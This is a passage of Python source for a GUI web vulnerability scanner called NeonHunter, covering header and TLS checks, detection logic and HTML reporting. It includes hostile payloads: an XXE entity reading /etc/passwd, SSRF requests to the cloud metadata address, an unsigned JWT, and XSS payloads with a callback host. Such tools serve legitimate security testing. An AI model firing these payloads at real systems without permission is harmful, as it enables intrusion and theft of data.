                      command=window.destroy, width=15).pack(pady=10)
        
    def show_about(self):
        """Show enhanced about dialog with icons"""
        about_text = """
🌟 NEONHUNTER v3.5 - ULTIMATE BUG BOUNTY SUITE 🌟
===================================================

⚡ "HUNT ETHICALLY, STAY SECURE"

🎯 DEVELOPED BY:
Dickson Godwin Massawe
💻 GitHub: https://github.com/dkhacker707

📅 VERSION: 3.5 PRO EDITION
📦 RELEASE: Professional Bug Bounty Suite

🔥 CORE FEATURES:
✅ 10+ Vulnerability Types Detection
✅ Concurrent Multi-threaded Scanning
✅ Batch Target Processing
✅ Professional HTML Reports
✅ Blind XSS Server Integration
✅ Custom Payload Generator
✅ Session Management
✅ Real-time Monitoring
✅ Screenshot Capture
✅ Advanced Detection Engine

🎨 UI ENHANCEMENTS:
✅ Optimized for Better Visibility
✅ Color-coded Severity Levels
✅ Real-time Statistics
✅ Keyboard Shortcuts
✅ Animated Elements
✅ High Contrast Mode
✅ Responsive Design

🔧 TECHNOLOGIES USED:
• Python 3.8+
• Tkinter (GUI)
• Requests (HTTP)
• BeautifulSoup4 (Parsing)
• Selenium (Screenshots)
• Threading (Concurrency)

📊 REPORTING CAPABILITIES:
• Professional HTML Reports
• CSV Export
• JSON Export
• Statistics Dashboard
• Executive Summaries
• Detailed Findings

🚀 PERFORMANCE:
• Concurrent scanning (1-10 threads)
• Batch processing
• Memory efficient
• Fast payload testing
• Real-time updates

🔒 SECURITY ETHICS:
• For authorized testing only
• Educational purpose
• Respect privacy
• Follow guidelines
• Report responsibly

📞 CONTACT & SUPPORT:
• GitHub Issues: Bug reports
• Feature Requests: GitHub
• Security Concerns: Private disclosure

🎯 MISSION:
To provide security professionals with powerful,
easy-to-use tools for identifying web vulnerabilities
and improving application security.

📄 LICENSE:
MIT License - Free for educational and authorized testing

💡 TIP:
Always get proper authorization before testing.
Great power comes with great responsibility!

⚡ "CODE WITH PASSION, HUNT WITH PRECISION"
        """
        
        self.show_info_window("🌟 About NeonHunter", about_text, width=80, height=40)
        
    def analyze_headers(self):
        """Analyze HTTP headers of target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter target URL first")
            return
        
        try:
            session = self.get_session()
            response = session.get(target, timeout=10, allow_redirects=False)
            
            header_analysis = self.perform_header_analysis(response.headers)
            
            analysis_text = f"""
🔍 HEADER ANALYSIS FOR: {target}
================================

📊 BASIC INFORMATION:
• Status Code: {response.status_code}
• Server: {response.headers.get('Server', 'Not disclosed')}
• Content Type: {response.headers.get('Content-Type', 'Not specified')}
• Content Length: {response.headers.get('Content-Length', 'Unknown')}

⚠️ SECURITY HEADERS ANALYSIS:
"""
            
            for header, info in header_analysis.items():
                analysis_text += f"\n{header}:\n"
                analysis_text += f"  Status: {info['status']}\n"
                analysis_text += f"  Value: {info['value']}\n"
                analysis_text += f"  Recommendation: {info['recommendation']}\n"
            
            analysis_text += f"\n📋 ALL HEADERS:\n"
            for header, value in response.headers.items():
                analysis_text += f"• {header}: {value}\n"
            
            self.show_info_window("🔍 Header Analysis", analysis_text)
            
        except Exception as e:
            messagebox.showerror("Analysis Error", f"Failed to analyze headers: {e}")
            
    def perform_header_analysis(self, headers):
        """Analyze security headers"""
        security_headers = {
            'Content-Security-Policy': {
                'check': 'Content-Security-Policy' in headers,
                'good': "Present",
                'bad': "Missing - Allows XSS attacks",
                'recommendation': "Implement CSP to prevent XSS"
            },
            'X-Frame-Options': {
                'check': 'X-Frame-Options' in headers,
                'good': "Present",
                'bad': "Missing - Allows clickjacking",
                'recommendation': "Set to DENY or SAMEORIGIN"
            },
            'X-Content-Type-Options': {
                'check': 'X-Content-Type-Options' in headers,
                'good': "Present",
                'bad': "Missing - MIME sniffing possible",
                'recommendation': "Set to nosniff"
            },
            'Strict-Transport-Security': {
                'check': 'Strict-Transport-Security' in headers,
                'good': "Present",
                'bad': "Missing - No forced HTTPS",
                'recommendation': "Implement HSTS"
            },
            'X-XSS-Protection': {
                'check': 'X-XSS-Protection' in headers,
                'good': "Present",
                'bad': "Missing - No XSS protection",
                'recommendation': "Set to 1; mode=block"
            },
            'Referrer-Policy': {
                'check': 'Referrer-Policy' in headers,
                'good': "Present",
                'bad': "Missing - Referrer leakage",
                'recommendation': "Set strict referrer policy"
            },
        }
        
        analysis = {}
        for header, info in security_headers.items():
            present = info['check']
            analysis[header] = {
                'status': "✅ " + info['good'] if present else "❌ " + info['bad'],
                'value': headers.get(header, 'Not set'),
                'recommendation': info['recommendation']
            }
        
        return analysis
        
    def check_ssl(self):
        """Check SSL/TLS configuration"""
        target = self.target_entry.get().strip()
        if not target.startswith('https://'):
            messagebox.showwarning("Not HTTPS", "Target must use HTTPS for SSL check")
            return
        
        try:
            import ssl
            import socket
            
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or 443
            
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    ssl_info = f"""
🔐 SSL/TLS ANALYSIS FOR: {hostname}
===================================

📊 CONNECTION INFO:
• Protocol: {version}
• Cipher Suite: {cipher[0]}
• Key Exchange: {cipher[1]}
• Encryption: {cipher[2]}

📜 CERTIFICATE INFORMATION:
"""
                    
                    if cert:
                        # Subject
                        subject = dict(x[0] for x in cert.get('subject', []))
                        ssl_info += f"\n📝 SUBJECT:\n"
                        for key, value in subject.items():
                            ssl_info += f"  • {key}: {value}\n"
                        
                        # Issuer
                        issuer = dict(x[0] for x in cert.get('issuer', []))
                        ssl_info += f"\n🏢 ISSUER:\n"
                        for key, value in issuer.items():
                            ssl_info += f"  • {key}: {value}\n"
                        
                        # Validity
                        not_before = cert.get('notBefore', 'Unknown')
                        not_after = cert.get('notAfter', 'Unknown')
                        ssl_info += f"\n📅 VALIDITY:\n"
                        ssl_info += f"  • Not Before: {not_before}\n"
                        ssl_info += f"  • Not After: {not_after}\n"
                        
                        # Check expiration
                        from datetime import datetime
                        if not_after != 'Unknown':
                            expiry = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                            days_left = (expiry - datetime.now()).days
                            ssl_info += f"  • Days Until Expiry: {days_left}\n"
                            if days_left < 30:
                                ssl_info += "  ⚠️ WARNING: Certificate expires soon!\n"
                    
                    # Additional checks
                    ssl_info += f"\n🔍 SECURITY CHECKS:\n"
                    
                    # Check TLS version
                    if version == 'TLSv1.3':
                        ssl_info += "  ✅ TLS 1.3 (Most Secure)\n"
                    elif version == 'TLSv1.2':
                        ssl_info += "  ✅ TLS 1.2 (Secure)\n"
                    elif version in ['TLSv1.1', 'TLSv1']:
                        ssl_info += "  ⚠️ Deprecated TLS version\n"
                    else:
                        ssl_info += "  ❌ Insecure protocol\n"
                    
                    # Check cipher strength
                    if 'AES' in cipher[0] and 'GCM' in cipher[0]:
                        ssl_info += "  ✅ Strong cipher (AES-GCM)\n"
                    elif 'CHACHA20' in cipher[0]:
                        ssl_info += "  ✅ Strong cipher (ChaCha20)\n"
                    else:
                        ssl_info += "  ⚠️ Consider stronger cipher\n"
                    
                    self.show_info_window("🔐 SSL/TLS Check", ssl_info)
                    
        except Exception as e:
            messagebox.showerror("SSL Check Error", f"Failed to check SSL: {e}")
            
    def toggle_color_blind_mode(self):
        """Toggle color blind friendly mode"""
        if not hasattr(self, 'color_blind_mode'):
            self.color_blind_mode = False
        
        self.color_blind_mode = not self.color_blind_mode
        
        if self.color_blind_mode:
            # Color blind friendly colors
            self.update_colors({
                'critical': '#0000ff',  # Blue
                'high': '#ff8c00',      # Dark orange
                'medium': '#ffff00',    # Yellow
                'low': '#008000',       # Green
                'success': '#00ff88',
                'error': '#ff0000',
                'warning': '#ffa500',
                'info': '#00ccff'
            })
            self.log("🎨 Color blind mode enabled")
        else:
            # Original colors
            self.update_colors({
                'critical': '#ff0000',
                'high': '#ff6600',
                'medium': '#ffff00',
                'low': '#00ff00',
                'success': '#00ff88',
                'error': '#ff0000',
                'warning': '#ffff00',
                'info': '#00ccff'
            })
            self.log("🎨 Color blind mode disabled")
            
    def update_colors(self, color_map):
        """Update UI colors"""
        # Update text widget tags
        for tag, color in color_map.items():
            self.log_text.tag_config(tag, foreground=color)
            
    def export_logs(self):
        """Export logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get('1.0', tk.END))
                self.log(f"📤 Logs exported to: {filename}")
            except Exception as e:
                self.log(f"❌ Export failed: {e}")
                
    def report_bug(self):
        """Report a bug"""
        bug_info = """
🐛 BUG REPORT
============

Please report bugs to:
• GitHub Issues: https://github.com/dkhacker707/NEONHUNTER/issues
• Email: Check GitHub profile

📋 Include in your report:
1. NeonHunter version
2. Steps to reproduce
3. Expected behavior
4. Actual behavior
5. Screenshots (if applicable)
6. Error messages
7. Target URL (if safe to share)

🔧 For crash reports, include:
• Python version
• Operating system
• Full error traceback
• Configuration file (if any)

Thank you for helping improve NeonHunter! 🚀
        """
        
        self.show_info_window("🐛 Report Bug", bug_info)
        
    def request_feature(self):
        """Request a new feature"""
        feature_info = """
💡 FEATURE REQUEST
==================

Have an idea for NeonHunter? Let us know!

📝 Submit feature requests to:
• GitHub Issues: https://github.com/dkhacker707/NEONHUNTER/issues
• Use "Feature Request" label

🎯 Include in your request:
1. Feature description
2. Why it's useful
3. How it should work
4. Any examples or references
5. Priority (High/Medium/Low)

🚀 Example features:
• New vulnerability checks
• UI improvements
• Performance enhancements
• Integration with other tools
• Additional reporting formats

We appreciate your suggestions! 🌟
        """
        
        self.show_info_window("💡 Feature Request", feature_info)
        
    def theme_settings(self):
        """Open simple theme settings dialog"""
        window = tk.Toplevel(self.root)
        window.title("🎨 Theme Settings")
        window.configure(bg='#000000')
        window.geometry("400x300")
        
        tk.Label(window, text="🎨 THEME SETTINGS", fg='#00ffff', bg='#000000',
                font=('Consolas', 16, 'bold')).pack(pady=20)
        
        # Theme options - SIMPLIFIED
        themes = [
            ("🌙 Dark Mode (Default)", "dark"),
            ("☀️ Light Mode", "light"),
        ]
        
        self.theme_var = tk.StringVar(value=self.current_theme)
        
        for theme_name, theme_id in themes:
            frame = tk.Frame(window, bg='#000000')
            frame.pack(fill='x', padx=50, pady=10)
            
            rb = tk.Radiobutton(frame, text=theme_name, variable=self.theme_var, value=theme_id,
                               bg='#000000', fg='#00ffff', 
                               selectcolor='#000000',
                               font=('Consolas', 11))
            rb.pack(side='left')
        
        # Apply button
        NeonIconButton(window, text="Apply Theme", 
                      command=lambda: self.apply_theme(window), width=15).pack(pady=20)
        
        # Preview button
        NeonIconButton(window, text="Preview", 
                      command=lambda: self.preview_theme(self.theme_var.get()), width=15).pack(pady=10)
        
    def apply_theme(self, window):
        """Apply selected theme"""
        # This would apply the theme colors
        self.log("🎨 Theme applied")
        window.destroy()
        
    def preview_theme(self):
        """Preview theme"""
        self.log("👁️ Theme preview - Not yet implemented")
        
    def quick_scan(self):
        """Perform quick scan with basic settings"""
        original_concurrent = self.concurrent_requests.get()
        original_delay = self.delay_var.get()
        
        # Set quick scan settings
        self.concurrent_requests.set(1)
        self.delay_var.set(0.2)
        
        self.log("⚡ Starting quick scan...")
        self.start_direct_fuzz()
        
        # Restore settings after scan
        def restore_settings():
            time.sleep(1)
            self.concurrent_requests.set(original_concurrent)
            self.delay_var.set(original_delay)
        
        threading.Thread(target=restore_settings, daemon=True).start()
        
    def deep_scan(self):
        """Perform deep scan with comprehensive settings"""
        original_concurrent = self.concurrent_requests.get()
        original_delay = self.delay_var.get()
        
        # Set deep scan settings
        self.concurrent_requests.set(5)
        self.delay_var.set(1.0)
        
        # Enable all vulnerability checks
        for var in self.vulns.values():
            var.set(True)
        
        self.log("🔬 Starting deep scan...")
        self.start_direct_fuzz()
        
        # Restore settings after scan
        def restore_settings():
            time.sleep(1)
            self.concurrent_requests.set(original_concurrent)
            self.delay_var.set(original_delay)
        
        threading.Thread(target=restore_settings, daemon=True).start()
        
    def show_tutorials(self):
        """Show tutorial videos and resources"""
        tutorials = """
🎬 NEONHUNTER TUTORIALS & RESOURCES
====================================

📺 VIDEO TUTORIALS:
1. Getting Started with NeonHunter
2. Basic Scanning Techniques
3. Advanced Features Guide
4. Reporting and Analysis
5. Custom Payload Creation
6. Batch Scanning Workflow

📖 WRITTEN GUIDES:
• Installation Guide
• Configuration Guide
• Usage Examples
• Troubleshooting
• Best Practices

🔗 RESOURCES:
• Official Documentation: GitHub Wiki
• Sample Targets for Testing
• Payload Databases
• Security References
• Community Forum

🎯 PRACTICE TARGETS:
• testphp.vulnweb.com
• demo.testfire.net
• juice-shop.herokuapp.com
• bodgeit-store.herokuapp.com

📚 LEARNING PATH:
1. Start with single target scanning
2. Learn to interpret results
3. Practice with batch scanning
4. Experiment with custom payloads
5. Master reporting features

💡 TIPS:
• Always test on authorized targets
• Start with quick scans
• Review findings carefully
• Document your process
• Stay updated with new features

🚀 NEXT STEPS:
1. Complete basic tutorials
2. Practice on test targets
3. Join security communities
4. Contribute to the project
5. Share your knowledge
        """
        
        self.show_info_window("🎬 Tutorials & Resources", tutorials)
        
    def advanced_detection(self, vuln_type, payload, response, url):
        """Advanced vulnerability detection"""
        evidence = []
        vulnerable = False
        
        text = response.text.lower()
        headers = str(response.headers).lower()
        
        if vuln_type == 'XSS':
            if payload.lower() in text:
                vulnerable = True
                evidence.append("Payload reflected in response")
            
            script_patterns = ['<script>', 'alert(', 'onerror=', 'onload=']
            if any(pattern in text for pattern in script_patterns):
                vulnerable = True
                evidence.append("Script indicators found")
        
        elif vuln_type == 'SQLi':
            sql_errors = [
                'sql syntax', 'mysql', 'oracle', 'postgresql',
                'syntax error', 'unclosed quotation', 'warning: mysql',
                'you have an error in your sql syntax'
            ]
            
            if any(error in text for error in sql_errors):
                vulnerable = True
                evidence.append("SQL error in response")
            
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                evidence.append("Time-based payload detected")
        
        elif vuln_type == 'LFI':
            lfi_indicators = [
                'root:', 'daemon:', 'bin/', 'etc/passwd',
                'proc/self/environ', 'boot.ini'
            ]
            if any(indicator in text for indicator in lfi_indicators):
                vulnerable = True
                evidence.append("LFI indicators found")
        
        elif vuln_type == 'Command Injection':
            cmd_indicators = [
                'uid=', 'gid=', 'groups=', 'root',
                'volume in drive', 'directory of'
            ]
            if any(indicator in text for indicator in cmd_indicators):
                vulnerable = True
                evidence.append("Command output found")
        
        elif vuln_type == 'Open Redirect':
            final_url = response.url.lower()
            if 'google.com' in final_url or 'evil.com' in final_url:
                vulnerable = True
                evidence.append("Redirected to external domain")
        
        elif vuln_type == 'SSTI':
            if '49' in text or '343' in text:
                vulnerable = True
                evidence.append("Template expression executed")
        
        elif vuln_type == 'HPP':
            if payload.count('admin') > 0 and 'admin' in text:
                vulnerable = True
                evidence.append("Parameter pollution successful")
        
        return {'vulnerable': vulnerable, 'evidence': evidence}
        
    def process_vulnerability_result(self, result):
        """Process vulnerability findings"""
        self.vuln_counter += 1
        
        screenshot = self.take_screenshot(result['url'], self.vuln_counter)
        
        severity = self.get_advanced_severity(result['vuln_type'], result['evidence'])
        
        if severity == 'Critical':
            self.stats['critical_findings'] += 1
        
        finding = {
            'id': str(uuid.uuid4())[:8],
            'timestamp': datetime.now().isoformat(),
            'vuln_type': result['vuln_type'],
            'severity': severity,
            'url': result['url'],
            'param': result['param'],
            'payload': result['payload'],
            'evidence': result['evidence'],
            'screenshot': screenshot,
            'response_code': result['response'].status_code,
            'poc_number': self.vuln_counter
        }
        
        self.results.append(finding)
        
        log_msg = f"🎯 [VULN {self.vuln_counter}] {result['vuln_type']} ({severity})"
        log_msg += f" in '{result['param']}' - Evidence: {', '.join(result['evidence'])}"
        self.log(log_msg)
        
        if severity == 'Critical':
            self.play_alert_sound()
            
    def get_advanced_severity(self, vuln_type, evidence):
        """Determine severity"""
        severity_map = {
            'XSS': 'Critical',
            'SQLi': 'Critical',
            'Command Injection': 'Critical',
            'LFI': 'High',
            'SSTI': 'High',
            'XXE': 'High',
            'SSRF': 'Medium',
            'Open Redirect': 'Medium',
            'HPP': 'Medium',
            'JWT': 'Low'
        }
        
        base_severity = severity_map.get(vuln_type, 'Medium')
        
        if 'remote code execution' in str(evidence).lower():
            return 'Critical'
        elif 'data leakage' in str(evidence).lower():
            return 'High'
        
        return base_severity
        
    def discover_parameters(self, url):
        """Discover parameters from URL and page content"""
        params = list(parse_qs(urlparse(url).query).keys())
        
        try:
            session = self.get_session()
            response = session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name and name not in params:
                        params.append(name)
            
            script_tags = soup.find_all('script')
            for script in script_tags:
                if script.string:
                    patterns = [
                        r'var\s+(\w+)\s*=',
                        r'let\s+(\w+)\s*=',
                        r'const\s+(\w+)\s*=',
                        r'\.get\(\s*["\'](\w+)["\']',
                        r'\.post\(\s*["\'](\w+)["\']'
                    ]
                    for pattern in patterns:
                        matches = re.findall(pattern, script.string)
                        params.extend(matches)
            
            url_patterns = [
                r'window\.location\.search\??&?(\w+)=',
                r'URLSearchParams\(\s*["\'](\w+)["\']'
            ]
            for script in script_tags:
                if script.string:
                    for pattern in url_patterns:
                        matches = re.findall(pattern, script.string)
                        params.extend(matches)
        
        except Exception as e:
            self.log(f"❌ Parameter discovery error: {e}")
        
        return list(set(params))
        
    def get_common_parameters(self):
        """Get common parameters"""
        return [
            'id', 'name', 'user', 'username', 'password', 'email',
            'q', 'query', 'search', 'keyword', 'term',
            'page', 'page_id', 'p', 'offset', 'limit',
            'sort', 'order', 'dir',
            'cat', 'category', 'type', 'mode',
            'view', 'action', 'do', 'cmd',
            'api_key', 'token', 'access_token', 'auth',
            'session', 'sess', 'sid',
            'file', 'filename', 'path', 'dir',
            'redirect', 'return', 'next', 'ref',
            'lang', 'language', 'locale',
            'callback', 'jsonp',
            'admin', 'administrator', 'superuser',
            'debug', 'test', 'dev', 'development',
            'config', 'setting', 'option',
        ]
        
    def advanced_scan_complete(self):
        """Handle scan completion"""
        self.stats['end_time'] = datetime.now()
        duration = self.stats['end_time'] - self.stats['start_time']
        
        self.progress.stop()
        self.fuzz_btn.config(state='normal')
        self.pause_btn.config(state='disabled')
        self.stop_btn.config(state='disabled')
        self.is_running = False
        
        summary = f"""
✅ SCAN COMPLETE
⏱️ Duration: {str(duration).split('.')[0]}
📊 Requests: {self.stats['requests_sent']}
❌ Errors: {self.stats['errors']}
⚠️ Critical Findings: {self.stats['critical_findings']}
🔍 Total Vulnerabilities: {len(self.results)}
        """
        
        self.log(summary)
        if hasattr(self, 'status_text_widget') and self.status_text_widget:
            self.status_text_widget.config(text="✅ READY", fg='#00ff00')
            
        if self.auto_save_var.get() and self.results:
            self.export_advanced_results()
            
    def build_test_url(self, base_url, param, payload):
        """Build test URL with payload"""
        parsed = urlparse(base_url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        return parsed._replace(query=urlencode(query, doseq=True)).geturl()
        
    def initialize_payloads(self):
        """Initialize payloads dictionary"""
        if not hasattr(self, 'payloads'):
            self.payloads = {}
            
        # Built-in payloads
        self.payloads.update({
            'XSS': AdvancedPayloadGenerator.generate_xss_payloads(f"http://{self.callback_ip}:8000"),
            'SSTI': AdvancedPayloadGenerator.generate_ssti_payloads(),
            'SQLi': AdvancedPayloadGenerator.generate_sqli_payloads(),
            'Open Redirect': AdvancedPayloadGenerator.generate_open_redirect_payloads(),
            'HPP': AdvancedPayloadGenerator.generate_hpp_payloads(),
            'LFI': AdvancedPayloadGenerator.generate_lfi_payloads(),
            'Command Injection': AdvancedPayloadGenerator.generate_command_injection_payloads(),
            'XXE': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
            'SSRF': ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080/admin'],
            'JWT': ['eyJ0eXAiOiJKV1QiLCJhbGciOiJub25eIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'],
        })
        
        # Add custom payloads if they exist
        if hasattr(self, 'custom_payloads') and self.custom_payloads:
            for vuln_type, payloads in self.custom_payloads.items():
                if vuln_type in self.payloads:
                    self.payloads[vuln_type].extend(payloads)
                else:
                    self.payloads[vuln_type] = payloads
        
        # Initialize custom payloads storage if not exists
        if not hasattr(self, 'custom_payloads'):
            self.custom_payloads = {}
    
    def load_targets_from_file(self):
        """Load multiple targets from file"""
        return self.batch_processor.load_targets_from_file_gui()
                
    def start_batch_scan(self):
        """Start batch scanning"""
        if not self.batch_processor.targets:
            self.load_targets_file()
            if not self.batch_processor.targets:
                return
        
        if self.is_running:
            messagebox.showwarning("Scan Running", 
                                 "Stop current scan before starting batch scan.")
            return
        
        self.batch_processor.start_batch_scan()
        
    def check_for_updates(self):
        try:
            self.log("🔄 Checking for updates...")
            response = requests.get("https://api.github.com/repos/dkhacker707/NEONHUNTER/releases/latest", timeout=10)
            if response.status_code == 200:
                data = response.json()
                latest = data["tag_name"].lstrip("v")
                current = "3.5"
                if float(latest) > float(current):
                    self.log(f"🔄 UPDATE AVAILABLE: v{latest}")
                    messagebox.showinfo("Update Available", 
                                      f"New version v{latest} available!\nCurrent: v{current}\n\nCheck GitHub for details.")
                else:
                    self.log("✅ You are on the latest version")
            else:
                self.log("❌ Could not check updates")
        except:
            self.log("❌ Update check failed (no internet?)")
            
    def show_help(self):
        """Show help window"""
        help_text = """
❓ NEONHUNTER v3.5 HELP

🎯 BASIC USAGE:
1. Enter target URL
2. Select vulnerabilities to test
3. Click START FUZZ or press Ctrl+F

⌨️ KEYBOARD SHORTCUTS:
• Ctrl+O  - Load targets file
• Ctrl+F  - Start fuzzing
• Ctrl+P  - Pause/Resume
• Ctrl+Q  - Stop scan
• Ctrl+B  - Batch scan
• Ctrl+E  - Export report
• Ctrl+R  - Clear monitors
• Ctrl+S  - Save config
• Ctrl+L  - Load config
• F1      - Show help
• F5      - Check updates

⚡ ADVANCED FEATURES:
• Custom payloads editor
• Batch scanning
• Session management
• Blind XSS server
• Professional HTML reports
• Concurrency control (1-10 threads)

📁 FILES GENERATED:
• screenshots/ - Proof of Concept images
• blind_xss_logs/ - Blind XSS callbacks
• backups/ - Auto-saved scan data
• neonhunter_config.json - Configuration
"""
        
        messagebox.showinfo("NeonHunter Help", help_text)
        
    def show_keyboard_shortcuts(self):
        """Show keyboard shortcuts dialog"""
        shortcuts = """
⌨️ NAVIGATION:
Ctrl+O  - Load targets file
Ctrl+S  - Save configuration
Ctrl+L  - Load configuration

🔍 SCANNING:
Ctrl+F  - Start fuzzing
Ctrl+P  - Pause/Resume scan
Ctrl+Q  - Stop scan
Ctrl+B  - Start batch scan
Ctrl+R  - Clear monitors

📊 REPORTING:
Ctrl+E  - Export results
Alt+F4  - Exit application

❓ HELP:
F1      - Show help
F5      - Check for updates
"""
        
        messagebox.showinfo("Keyboard Shortcuts", shortcuts)
        
    def show_documentation(self):
        """Show documentation"""
        messagebox.showinfo("Documentation", 
                          "Full documentation available at:\nhttps://github.com/dkhacker707/NEONHUNTER")
        
    def copy_url(self):
        """Copy URL to clipboard"""
        url = self.target_entry.get()
        self.root.clipboard_clear()
        self.root.clipboard_append(url)
        self.log("📋 URL copied to clipboard")
        
    def copy_logs(self):
        """Copy logs to clipboard"""
        logs = self.log_text.get('1.0', tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(logs)
        self.log("📋 Logs copied to clipboard")
        
    def save_logs(self):
        """Save logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            with open(filename, 'w') as f:
                f.write(self.log_text.get('1.0', tk.END))
            self.log(f"💾 Logs saved to {filename}")
            
    def clear_logs(self):
        """Clear all logs"""
        self.log_text.delete('1.0', tk.END)
        self.log("🧹 Logs cleared")
        
    def clear_all(self):
        """Clear all fields"""
        self.target_entry.delete(0, tk.END)
        self.proxy_entry.delete(0, tk.END)
        self.log_text.delete('1.0', tk.END)
        self.results = []
        self.log("🧹 All fields cleared")
        
    def search_logs(self):
        """Search in logs"""
        search_term = self.log_search.get()
        if not search_term:
            return
        
        self.log_text.tag_remove('search', '1.0', tk.END)
        
        start_pos = '1.0'
        while True:
            start_pos = self.log_text.search(search_term, start_pos, tk.END, nocase=True)
            if not start_pos:
                break
            end_pos = f"{start_pos}+{len(search_term)}c"
            self.log_text.tag_add('search', start_pos, end_pos)
            self.log_text.tag_config('search', background='#ffff00', foreground='#000000')
            start_pos = end_pos
            
    def test_connection(self):
        """Test connection to target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter target URL first")
            return
        
        try:
            session = self.get_session()
            response = session.get(target, timeout=10, allow_redirects=False)
            messagebox.showinfo("Connection Test", 
                              f"✅ Connection successful!\n\nStatus: {response.status_code}\nServer: {response.headers.get('Server', 'Not disclosed')}")
            self.log(f"✅ Connection test successful: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Connection Test", f"❌ Connection failed:\n{e}")
            self.log(f"❌ Connection test failed: {e}")
            
    def export_advanced_results(self):
        """Export results in multiple formats"""
        if not self.results:
            messagebox.showwarning("No Results", "No vulnerabilities found to export")
            return
        
        # Ask for format
        format_choice = simpledialog.askstring(
            "Export Format",
            "Choose format:\n1. HTML (Professional Report)\n2. CSV\n3. JSON\n\nEnter 1, 2, or 3:"
        )
        
        if not format_choice:
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".html" if format_choice == "1" else ".csv" if format_choice == "2" else ".json",
            filetypes=[
                ("HTML files", "*.html"),
                ("CSV files", "*.csv"),
                ("JSON files", "*.json"),
                ("All files", "*.*")
            ]
        )
        
        if not filename:
            return
        
        try:
            if format_choice == "1":
                self.generate_html_report(filename)
            elif format_choice == "2":
                self.export_results_csv(filename)
            elif format_choice == "3":
                self.export_results_json(filename)
            
            self.log(f"📊 Results exported to {filename}")
            messagebox.showinfo("Export Successful", f"Results exported to:\n{filename}")
        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to export results:\n{e}")
            self.log(f"❌ Export failed: {e}")

    def generate_html_report(self, filename):
        """Generate professional HTML report"""
        html_content = self.create_professional_report_html()
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

    def create_professional_report_html(self):
        """Create professional HTML report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        target = self.target_entry.get() or "Unknown Target"
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>NEONHUNTER - Security Assessment Report</title>
    <style>
        :root {{
            --primary: #00ffff;
            --secondary: #ff00ff;
            --accent: #00ff88;
            --dark: #000;
            --darker: #110033;
            --darkest: #000011;
        }}
        
        body {{
            background: var(--dark);
            color: var(--accent);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px;
        }}
        
        .header {{
            text-align: center;
            padding: 40px 0;
            background: linear-gradient(135deg, var(--darker) 0%, #220066 100%);
            border-radius: 20px;
            margin-bottom: 40px;
            border: 3px solid var(--primary);
            box-shadow: 0 0 30px var(--primary);
            position: relative;
            overflow: hidden;
        }}
        
        h1 {{
            color: var(--primary);
            font-size: 3em;
            margin: 0;
            text-shadow: 0 0 20px var(--primary);
        }}
        
        h2 {{
            color: var(--secondary);
            font-size: 2em;
            margin: 20px 0;
            border-left: 5px solid var(--accent);
            padding-left: 15px;
        }}
        
        .vuln-card {{
            background: linear-gradient(145deg, var(--darker), #220044);
            border: 2px solid var(--primary);
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            transition: transform 0.3s;
        }}
        
        .vuln-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 255, 255, 0.3);
        }}
        
        .critical {{ color: #ff0000; font-weight: bold; }}
        .high {{ color: #ff6600; font-weight: bold; }}
        .medium {{ color: #ffff00; font-weight: bold; }}
        .low {{ color: #00ff00; font-weight: bold; }}
        
        .footer {{
            text-align: center;
            margin-top: 60px;
            padding-top: 40px;
            border-top: 3px solid var(--secondary);
            color: var(--accent);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>NEONHUNTER PRO - SECURITY REPORT</h1>
            <h2>Vulnerability, Exploit & Proof of Concept.</h2>
            <p>Target: {html_module.escape(target)}</p>
            <p>Scan Date: {timestamp}</p>
            <p>Total Vulnerabilities: {len(self.results)}</p>
        </div>
        
        <h2>VULNERABILITIES FOUND:</h2>
"""
    
        for vuln in self.results:
            severity_class = vuln['severity'].lower()
            screenshot_html = f'<br><strong>Screenshot:</strong> {vuln.get("screenshot", "No screenshot")}' if vuln.get('screenshot') else ''
            
            html += f"""
        <div class="vuln-card">
            <h3 class="{severity_class}">{vuln['vuln_type']} - {vuln['severity']}</h3>
            <p><strong>Parameter:</strong> {html_module.escape(vuln['param'])}</p>
            <p><strong>Payload:</strong> {html_module.escape(str(vuln['payload'])[:100])}</p>
            <p><strong>URL:</strong> {html_module.escape(vuln['url'])}</p>
            <p><strong>Evidence:</strong> {', '.join(vuln['evidence'])}</p>
            <p><strong>Status Code:</strong> {vuln['response_code']}</p>
            {screenshot_html}
        </div>
"""
    
        html += f"""
        <div class="footer">
            <p>Generated by NEONHUNTER v3.5</p>
